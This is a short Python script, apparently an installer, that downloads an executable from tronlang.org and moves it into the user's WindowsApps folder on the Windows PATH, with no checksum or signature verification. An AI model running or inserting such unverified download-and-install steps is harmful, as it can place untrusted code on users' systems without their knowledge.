import requests
import os

url = 'https://tronlang.org/kitten'
response = requests.get(url)
open('kitten.exe', 'wb').write(response.content)

os.system('move kitten.exe %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps\\')